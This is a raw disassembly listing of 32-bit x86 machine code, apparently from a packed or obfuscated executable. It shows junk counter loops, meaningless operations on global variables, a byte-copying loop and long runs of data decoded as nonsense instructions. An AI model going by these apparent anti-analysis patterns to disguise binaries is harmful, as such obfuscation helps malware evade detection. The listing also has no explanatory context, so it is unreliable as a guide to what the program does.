  410267:	outs   dx,DWORD PTR ds:[esi]
  410268:	jb     0x410296
  41026a:	sub    al,BYTE PTR [edx]
  41026c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41026d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41026e:	gs aam 0x92
  410271:	retf   
  410272:	sbb    ecx,DWORD PTR ds:0x125cecbb
  410278:	imul   esp,DWORD PTR [esi],0x2f
  41027b:	push   ebp
  41027c:	in     eax,dx
  41027d:	dec    eax
  41027e:	rol    BYTE PTR [ecx],1
  410280:	or     DWORD PTR [esi-0x2d],eax
  410283:	pop    ss
  410284:	mov    al,ds:0xeee0c9f3
  410289:	xchg   edx,ecx
  41028b:	pop    eax
  41028c:	push   ebp
  41028d:	or     DWORD PTR [ebx+0x50],esi
  410290:	jbe    0x4102d9
  410292:	arpl   WORD PTR [edi],cx
  410294:	repz mov esi,DWORD PTR [ebp-0x8]
  410298:	mov    DWORD PTR ds:0x4337eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43370f,0x433803
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433713,0x12
  4102c6:	cmp    DWORD PTR ds:0x433713,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433713,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433713,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433713
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433713,eax
  410303:	mov    eax,ds:0x433713
  410308:	dec    eax
  410309:	mov    ds:0x433713,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43370f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43370f
  41036b:	inc    eax
  41036c:	mov    ds:0x43370f,eax
  410371:	cmp    DWORD PTR ds:0x43370f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43370f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43370f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43370f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43370f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43371f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43377f,0x4337bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433767
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp+0x1770fd81],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x410390
  4103eb:	ror    DWORD PTR [ebp+esi*1+0x4f],0x43
  4103f0:	dec    edx
  4103f1:	inc    esp
  4103f2:	lods   al,BYTE PTR ds:[esi]
  4103f3:	leave  
  4103f4:	mov    edx,0x8137aa93
  4103f9:	leave  
  4103fa:	cld    
  4103fb:	jb     0x41044b
  4103fd:	rol    DWORD PTR [ebx],0x47
  410400:	and    eax,0x144927a9
  410405:	enter  0x7661,0x51
  410409:	dec    ecx
  41040a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41040b:	sub    bh,BYTE PTR [ecx+0x1c]
  41040e:	aaa    
  41040f:	xor    BYTE PTR [ebx],dl
  410411:	and    DWORD PTR [eax+edx*2],edx
  410414:	pop    ebp
  410415:	push   ss
  410416:	mov    WORD PTR cs:[ebp-0x42],fs
  41041a:	ror    BYTE PTR [eax-0x49a80413],0xf
  410421:	inc    edi
  410422:	push   0x1d4da1b
  410427:	fdivr  st,st(3)
  410429:	xchg   ebp,ebp
  41042b:	mov    edi,fs
  41042d:	ficom  DWORD PTR [edx+0x7b33c65e]
  410433:	and    BYTE PTR [esi],bh
  410435:	lods   al,BYTE PTR ds:[esi]
  410436:	push   ecx
  410437:	fstp   DWORD PTR [ebx-0x5e]
  41043a:	std    
  41043b:	test   esp,eax
  41043d:	jbe    0x41044b
  41043f:	lock sbb dh,ch
  410442:	repnz push ebx
  410444:	pop    esi
  410445:	icebp  
  410446:	lea    ecx,[edi+ebp*1-0x25]
  41044a:	cmp    ebx,DWORD PTR [eax-0x38]
  41044d:	mov    al,0x6c
  41044f:	push   esi
  410450:	ja     0x410422
  410452:	xchg   esi,eax
  410453:	in     al,0x86
  410455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410456:	cmp    eax,0x26ae14d0
  41045b:	addr16 sub al,0x42
  41045e:	call   0xec4c:0xe51fccf2
  410465:	in     eax,dx
  410466:	sbb    dl,ah
  410468:	cli    
  410469:	in     eax,0xb9
  41046b:	scas   eax,DWORD PTR es:[edi]
  41046c:	dec    esp
  41046d:	fidiv  WORD PTR [eax-0x1b]
  410470:	or     eax,DWORD PTR [esi+0x2a]
  410473:	cld    
  410474:	add    edi,ebp
  410476:	pusha  
  410477:	mov    al,0xb6
  410479:	imul   ebx,DWORD PTR [esi+0xfa485b0],0x42757a4d
  410483:	inc    esp
  410484:	and    eax,0x1faa237a
  410489:	js     0x4104f2
  41048b:	sbb    BYTE PTR [ebx+ebx*1-0x394f572d],bh
  410492:	scas   eax,DWORD PTR es:[edi]
  410493:	out    0xe7,al
  410495:	dec    edi
  410496:	sbb    al,0xb2
  410498:	sbb    ebp,DWORD PTR [esi+esi*4]
  41049b:	in     eax,0x8
  41049d:	pushf  
  41049e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41049f:	imul   ebp,DWORD PTR [ebx-0x4],0x6498dee7
  4104a6:	sub    DWORD PTR [eax+0xd],ebx
  4104a9:	bts    esi,0x89
  4104ad:	mov    ecx,0x512f1f2e
  4104b2:	adc    eax,ebp
  4104b4:	jecxz  0x410510
  4104b6:	push   ds
  4104b7:	(bad)  
  4104b8:	(bad)  
  4104b9:	stos   BYTE PTR es:[edi],al
  4104ba:	or     ebx,DWORD PTR [edi]
  4104bc:	pop    esi
  4104bd:	das    
  4104be:	cli    
  4104bf:	xor    esp,edx
  4104c1:	ret    
  4104c2:	or     esi,edx
  4104c4:	in     eax,dx
  4104c5:	xor    cl,BYTE PTR [ebp+0x4e]
  4104c8:	pop    es
  4104c9:	cmp    bh,BYTE PTR [ebx+0x1]
  4104cc:	arpl   bx,si
  4104ce:	outs   dx,BYTE PTR ds:[esi]
  4104cf:	in     al,0x6c
  4104d1:	lods   eax,DWORD PTR ds:[esi]
  4104d2:	adc    al,0x20
  4104d4:	jno    0x4104c2
  4104d6:	push   edx
  4104d7:	mov    ch,0x8
  4104d9:	ins    BYTE PTR es:[edi],dx
  4104da:	imul   eax,edi,0xffffffda
  4104dd:	inc    ebx
  4104de:	test   esi,0x8d58e2b5
  4104e4:	xchg   cl,bh
  4104e6:	div    cl
  4104e8:	lods   eax,DWORD PTR ds:[esi]
  4104e9:	push   0xffffffd5
  4104eb:	shr    DWORD PTR [esi],1
  4104ed:	(bad)  
  4104ef:	push   0xf56a3b53
  4104f4:	pop    edi
  4104f5:	cli    
  4104f6:	fist   WORD PTR [esi+edi*8-0x43]
  4104fa:	push   0x7a
  4104fc:	(bad)  
  4104fd:	scas   al,BYTE PTR es:[edi]
  4104fe:	cmp    DWORD PTR [edi],esp
  410500:	inc    eax
  410501:	sbb    al,0x90
  410503:	in     eax,0x4
  410505:	jno    0x41056e
  410507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410509:	outs   dx,BYTE PTR ds:[esi]
  41050a:	push   0xffffff99
  41050c:	sbb    cl,BYTE PTR ds:0x4f23b7b1
  410512:	push   esi
  410513:	cmp    al,0xb3
  410515:	mov    dh,0xda
  410517:	push   ss
  410518:	scas   eax,DWORD PTR es:[edi]
  410519:	sbb    eax,0x30898460
  41051e:	mov    bh,0xb9
  410520:	rcl    BYTE PTR [edx],1
  410522:	loop   0x4104dc
  410524:	loopne 0x410581
  410526:	jg     0x4104cf
  410528:	push   esp
  410529:	jle    0x410546
  41052b:	inc    ebx
  41052c:	push   ds
  41052d:	popa   
  41052e:	pushw  0x73
  410531:	scas   al,BYTE PTR es:[edi]
  410532:	in     eax,0xde
  410534:	repnz mov es,WORD PTR [ecx+0x2bc40844]
  41053b:	into   
  41053c:	push   esi
  41053d:	arpl   di,bp
  41053f:	cmp    eax,0x6684374b
  410544:	ror    BYTE PTR [eax+0x62],cl
  410547:	imul   ebx,DWORD PTR [ebx-0xf2c9a13],0x31
  41054e:	xor    al,cl
  410550:	mov    bh,BYTE PTR [ecx-0xafd6402]
  410556:	or     ebp,DWORD PTR [edx-0x3549b9f0]
  41055c:	clc    
  41055d:	out    dx,eax
  41055e:	pop    esi
  41055f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410561:	test   BYTE PTR [eax+eiz*1-0x65],dh
  410565:	mov    edi,0xd66a2c98
  41056a:	mov    al,0x75
  41056c:	push   edx
  41056d:	jne    0x4105d9
  41056f:	icebp  
  410570:	cmp    dl,al
  410572:	jp     0x410518
  410574:	dec    ebx
  410575:	inc    ebp
  410576:	jle    0x41056d
  410578:	(bad)  
  410579:	jge    0x410596
  41057b:	das    
  41057c:	jo     0x4105bb
  41057e:	add    edx,0x7
  410581:	addr16 pop esp
  410583:	cmp    eax,0xfc53896a
  410588:	imul   ecx,DWORD PTR [esi],0x6a
  41058b:	test   DWORD PTR [ecx-0xaefcfb],ebx
  410591:	cmp    al,BYTE PTR [edi+0x7440938e]
  410597:	sahf   
  410598:	inc    ecx
  410599:	lods   eax,DWORD PTR ds:[esi]
  41059a:	fld    DWORD PTR [ebp-0x70941273]
  4105a0:	and    BYTE PTR ds:0xd3f78f00,al
  4105a6:	inc    esi
  4105a7:	pop    ebp
  4105a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105a9:	cmp    BYTE PTR [eax+0x6e5ae44d],ah
  4105af:	cld    
  4105b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105b1:	jg     0x4105ee
  4105b3:	int3   
  4105b4:	xor    al,0xef
  4105b6:	mov    esi,0x24e07198
  4105bb:	aam    0xe3
  4105bd:	pop    ss
  4105be:	and    al,0xc3
  4105c0:	xchg   ebp,eax
  4105c1:	outs   dx,BYTE PTR ds:[esi]
  4105c2:	stc    
  4105c3:	in     al,0xcb
  4105c5:	xor    BYTE PTR [ebx+esi*1],cl
  4105c8:	ja     0x41063f
  4105ca:	jmp    FWORD PTR [ecx+0x6b40d3f2]
  4105d0:	arpl   WORD PTR [ebx+edx*1-0x6a65b566],sp
  4105d7:	gs mov ?,eax
  4105da:	leave  
  4105db:	inc    esp
  4105dc:	dec    ecx
  4105dd:	jo     0x4105e2
  4105df:	adc    ebp,DWORD PTR [edi]
  4105e1:	adc    eax,0x30c68de4
  4105e6:	pusha  
  4105e7:	push   esp
  4105e8:	outs   dx,DWORD PTR ds:[esi]
  4105e9:	adc    eax,0x3a9cde96
  4105ee:	repnz cmp eax,0x37d899f7
  4105f4:	cld    
  4105f5:	repnz loope 0x41060f
  4105f8:	dec    ecx
  4105f9:	sub    eax,0x9f3e18aa
  4105fe:	push   ss
  4105ff:	sub    al,0xc7
  410601:	lahf   
  410602:	xchg   edx,eax
  410603:	add    BYTE PTR [esi+0x3e],dh
  410606:	out    dx,al
  410607:	lods   eax,DWORD PTR ds:[esi]
  410608:	je     0x410612
  41060a:	mov    dh,0x8a
  41060c:	mov    edi,0xf4d31d96
  410611:	dec    eax
  410612:	clc    
  410613:	jecxz  0x41067d
  410615:	ds or  eax,0xe2d2778a
  41061b:	adc    bl,BYTE PTR [edi-0x426ef2d1]
  410621:	es je  0x4105ef
  410624:	aam    0xb2
  410626:	not    DWORD PTR [ebx]
  410628:	jp     0x4105f2
  41062a:	test   al,0xae
  41062c:	push   0x6a
  41062e:	iret   
  41062f:	jnp    0x41066a
  410631:	in     al,0x37
  410633:	or     dh,dh
  410635:	or     DWORD PTR [ebx+0x0],eax
  410638:	pop    edx
  410639:	dec    ecx
  41063a:	jmp    FWORD PTR [eax]
  41063c:	jecxz  0x4106b2
  41063e:	retf   0xd4f1
  410641:	ja     0x410609
  410643:	cwde   
  410644:	mov    ecx,0xb71972b0
  410649:	int    0x7d
  41064b:	xchg   ebx,eax
  41064c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41064d:	and    BYTE PTR [ecx-0x34],ah
  410650:	mov    ebx,0x8b0f8c4d
  410655:	cdq    
  410656:	add    DWORD PTR [ebx+ebp*4-0x673eac82],edi
  41065d:	daa    
  41065e:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  410665:	and    DWORD PTR ds:0x433713,0x0
  41066f:	mov    edx,DWORD PTR ds:0x433713
  410675:	inc    edx
  410676:	mov    DWORD PTR ds:0x433713,edx
  41067c:	cmp    DWORD PTR ds:0x433713,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433713,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4337ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43371b
  4106ad:	mov    DWORD PTR ds:0x4337ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433733,0x17
  4106c0:	cmp    DWORD PTR ds:0x433733,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433733,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4338fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433733,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433733
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433733,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433733
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433733,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4337f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4337b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433717,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433727,0x4337ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	jbe    0x4107a2
  4107d6:	push   edx
  4107d7:	fist   WORD PTR [ecx-0x15818145]
  4107dd:	jl     0x41085d
  4107df:	jle    0x4107d0
  4107e1:	mov    al,ds:0xc55a1bc0
  4107e6:	xlat   BYTE PTR ds:[ebx]
  4107e7:	gs ret 
  4107e9:	dec    eax
  4107ea:	xchg   esp,eax
  4107eb:	dec    ecx
  4107ec:	inc    esi
  4107ed:	xlat   BYTE PTR ds:[ebx]
  4107ee:	in     al,dx
  4107ef:	popf   
  4107f0:	mov    eax,esp
  4107f2:	jbe    0x4107cc
  4107f4:	ficom  DWORD PTR [edx+0x2c36de8a]
  4107fa:	xchg   esi,eax
  4107fb:	sbb    ebx,DWORD PTR gs:[ebx+ebx*2-0x5025d79c]
  410803:	fisttp WORD PTR [edx+0x47]
  410806:	cli    
  410807:	add    al,0xeb
  410809:	ins    BYTE PTR es:[edi],dx
  41080a:	bound  ecx,QWORD PTR [esi-0x2474109]
  410810:	cli    
  410811:	jns    0x410845
  410813:	inc    ebx
  410814:	mov    ds:0x4e5c1a5d,eax
  410819:	push   edx
  41081a:	(bad)  
  41081b:	dec    eax
  41081c:	test   edx,ecx
  41081e:	ror    DWORD PTR [edx],1
  410820:	dec    ecx
  410821:	cmp    ah,BYTE PTR [eax-0x18]
  410824:	mov    ecx,DWORD PTR [eax]
  410826:	and    BYTE PTR [edi],cl
  410828:	out    dx,eax
  410829:	out    dx,al
  41082a:	out    dx,al
  41082b:	mov    dh,0xa5
  41082d:	sbb    eax,0xa6d5f60
  410832:	pop    ebx
  410833:	mov    ch,0x5d
  410835:	fstp   QWORD PTR [esi]
  410837:	or     bh,BYTE PTR [esi+0x7c7b11ae]
  41083d:	inc    ebx
  41083e:	adc    BYTE PTR ds:0x6d90adac,bh
  410844:	adc    bl,BYTE PTR [esi-0x15]
  410847:	jge    0x4107cc
  410849:	and    BYTE PTR [ebp-0x7ab4a608],dl
  41084f:	adc    edx,DWORD PTR [edx]
  410851:	mov    ecx,DWORD PTR [ebp-0x2a4c8407]
  410857:	aas    
  410858:	in     al,dx
  410859:	pop    eax
  41085a:	pop    edi
  41085b:	lds    edi,FWORD PTR [edi-0x38f7768]
  410861:	les    edi,FWORD PTR ds:[edi+0x31]
  410865:	and    cl,dl
  410867:	int    0x2e
  410869:	test   BYTE PTR ds:0x3f79f085,ch
  41086f:	jmp    0x3d4d:0x5cccc68b
  410876:	xor    BYTE PTR [ebx-0x7325383f],ah
  41087c:	out    dx,al
  41087d:	fs mov ecx,gs
  410880:	or     eax,0xb6596ddb
  410885:	leave  
  410886:	add    bh,dh
  410888:	out    dx,al
  410889:	jmp    0x4108fe
  41088b:	sbb    al,0xef
  41088d:	shl    ebx,cl
  41088f:	fabs   
  410891:	sbb    bl,BYTE PTR [ebx+0x38]
  410894:	lock mov ebp,0x40f5a717
  41089a:	pop    esi
  41089b:	and    al,0xa7
  41089d:	jle    0x410873
  41089f:	ins    BYTE PTR es:[edi],dx
  4108a0:	int    0x4c
  4108a2:	or     al,0xac
  4108a4:	iret   
  4108a5:	add    eax,0xe7a1ae
  4108aa:	mov    ch,0x49
  4108ac:	std    
  4108ad:	retf   0x10cd
  4108b0:	xor    esp,edi
  4108b2:	sbb    ch,BYTE PTR [ebx+0x5736c769]
  4108b8:	test   DWORD PTR [eax+0x13dc077d],eax
  4108be:	not    BYTE PTR [edx+eiz*4]
  4108c1:	les    edi,FWORD PTR [eax]
  4108c3:	out    0x41,eax
  4108c5:	push   esi
  4108c6:	adc    al,0x40
  4108c8:	xchg   edx,eax
  4108c9:	popf   
  4108ca:	sub    BYTE PTR [ebx],0xad
  4108cd:	pop    esi
  4108ce:	mov    ebp,0x1aab4e9
  4108d3:	hlt    
  4108d4:	sub    BYTE PTR [edi-0x65],ah
  4108d7:	pop    edi
  4108d8:	ret    0x33e9
  4108db:	sub    edi,DWORD PTR [esi]
  4108dd:	jg     0x41089d
  4108df:	xrelease mov BYTE PTR [ebp+0x33],dh
  4108e3:	lahf   
  4108e4:	xchg   DWORD PTR [ecx-0x584927f1],eax
  4108ea:	mov    eax,0x3f91bc9a
  4108ef:	add    al,ah
  4108f1:	iret   
  4108f2:	fwait
  4108f3:	std    
  4108f4:	or     al,0x2c
  4108f6:	xor    ecx,esi
  4108f8:	dec    ebx
  4108f9:	mov    gs,WORD PTR [edx-0x79]
  4108fc:	mov    ecx,0xdb5f12ca
  410901:	test   DWORD PTR [edx],esp
  410903:	sbb    eax,0x800b279d
  410908:	sbb    dl,BYTE PTR [eax+0x6812eb42]
  41090e:	mov    al,ds:0x5556ae94
  410913:	shl    BYTE PTR [edi+ebp*4],0xea
  410917:	lods   eax,DWORD PTR ds:[esi]
  410918:	in     al,dx
  410919:	int    0xf5
  41091b:	mov    al,ds:0x5744f6d1
  410920:	add    BYTE PTR [ecx-0x5749b7d6],bh
  410926:	add    BYTE PTR [eax+0x7d],ch
  410929:	push   cs
  41092a:	jb     0x4108d7
  41092c:	push   eax
  41092d:	push   eax
  41092e:	das    
  41092f:	add    ebx,DWORD PTR [ecx-0x5e1771b5]
  410935:	push   ebp
  410936:	fstp   QWORD PTR [ebp-0x78]
  410939:	ins    DWORD PTR es:[edi],dx
  41093a:	ret    0xe43e
  41093d:	dec    ecx
  41093e:	inc    edi
  41093f:	out    0xcc,al
  410941:	or     esp,DWORD PTR [edi+0x2e3be84f]
  410947:	mov    ch,ch
  410949:	out    dx,eax
  41094a:	fldenv [ebx+ebp*4-0x5ba37884]
  410951:	sub    al,dl
  410953:	int3   
  410954:	sahf   
  410955:	mov    ah,dh
  410957:	cwde   
  410958:	icebp  
  410959:	out    dx,al
  41095a:	inc    ebx
  41095b:	or     esi,DWORD PTR [edx]
  41095d:	test   al,0x8d
  41095f:	(bad)
  410964:	out    dx,eax
  410965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410966:	in     al,0x36
  410968:	jae    0x4109ad
  41096a:	xchg   edi,eax
  41096b:	(bad)
  41096e:	sbb    BYTE PTR [eax],dl
  410970:	mov    al,ds:0x92cc4a13
  410975:	xor    eax,0xf2bd004e
  41097a:	pop    ebx
  41097b:	ja     0x410929
  41097d:	repnz sti 
  41097f:	adc    esp,ebx
  410981:	jl     0x4109d6
  410983:	inc    eax
  410984:	jne    0x4109af
  410986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410987:	cli    
  410988:	xor    BYTE PTR [ebx],bh
  41098a:	xchg   edi,eax
  41098b:	mov    edi,ecx
  41098d:	scas   al,BYTE PTR es:[edi]
  41098e:	cwde   
  41098f:	jmp    0x4109cd
  410991:	add    esp,DWORD PTR [esi]
  410993:	xchg   ecx,eax
  410994:	lds    ecx,FWORD PTR [ebx+0x62dddef4]
  41099a:	fldlg2 
  41099c:	hlt    
  41099d:	push   ecx
  41099e:	ss push ds
  4109a0:	mov    ebp,0x569f6ed1
  4109a5:	mov    ss,WORD PTR [edi]
  4109a7:	xchg   esi,eax
  4109a8:	pop    ebp
  4109a9:	mov    DWORD PTR [ebx-0x3153bae1],edi
  4109af:	bound  ebx,QWORD PTR [edx]
  4109b1:	(bad)  
  4109b2:	ds (bad) 
  4109b4:	rcl    esi,cl
  4109b6:	shl    al,cl
  4109b8:	mov    ch,0x99
  4109ba:	mov    BYTE PTR [ebx+0x62513f31],al
  4109c0:	lahf   
  4109c1:	retf   0xe0ee
  4109c4:	jno    0x410a12
  4109c6:	mov    cl,0x4c
  4109c8:	out    dx,eax
  4109c9:	dec    esi
  4109ca:	mov    ss,WORD PTR [eax]
  4109cc:	call   0xd828330c
  4109d1:	data16 jecxz 0x4109cc
  4109d4:	fld    TBYTE PTR [eax+ebp*2+0x45cefd97]
  4109db:	dec    ecx
  4109dc:	repz pop ecx
  4109de:	out    dx,eax
  4109df:	or     edi,DWORD PTR [esi+0x1a909556]
  4109e5:	imul   edx,DWORD PTR [ebx+0x41],0xa4b79100
  4109ec:	push   esi
  4109ed:	mov    eax,0xa123b04e
  4109f2:	mov    edx,0x2e142083
  4109f7:	xchg   ebp,eax
  4109f8:	nop
  4109f9:	sbb    al,0xf
  4109fb:	imul   eax,DWORD PTR [ecx-0x7a6e15cb],0x495fa489
  410a05:	aaa    
  410a06:	push   eax
  410a07:	sbb    DWORD PTR [edx],ecx
  410a09:	cmp    BYTE PTR [edx+eiz*2+0x75],bh
  410a0d:	out    0xcd,eax
  410a0f:	mov    ebp,0xe1d32ca
  410a14:	jmp    0x57b2:0xd1445585
  410a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a1c:	je     0x410a33
  410a1e:	outs   dx,BYTE PTR ds:[esi]
  410a1f:	dec    edi
  410a20:	dec    esi
  410a21:	nop
  410a22:	and    BYTE PTR [esi+0x4ccfd441],cl
  410a28:	inc    ecx
  410a29:	jmp    0x647f:0x53b5948b
  410a30:	inc    eax
  410a31:	lea    edx,[edi-0x606531d8]
  410a37:	das    
  410a38:	aaa    
  410a39:	pushw  ds
  410a3b:	in     al,dx
  410a3c:	mov    ecx,0xcfa5e605
  410a41:	add    al,0x5a
  410a43:	jecxz  0x410a6e
  410a45:	rol    bl,0x4e
  410a48:	xor    BYTE PTR ds:0x68c83d9b,0xf9
  410a4f:	call   DWORD PTR [esi]
  410a51:	and    eax,0x32b8133a
  410a56:	test   DWORD PTR [eax+edi*8-0x3d36a1a1],ebx
  410a5d:	or     al,0x0
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4337e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4337bf
  410a95:	sbb    eax,DWORD PTR ds:0x433843
  410a9b:	mov    ds:0x4337bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4337b7,0x4337ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4337af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433767,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4337f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43372b,0x433737
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43372b
  410b09:	sbb    DWORD PTR ds:0x433773,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	stc    
  410b21:	int    0xff
  410b23:	jne    0x410b32
  410b25:	inc    esi
  410b26:	jle    0x410ba6
  410b28:	icebp  
  410b29:	jg     0x410ba9
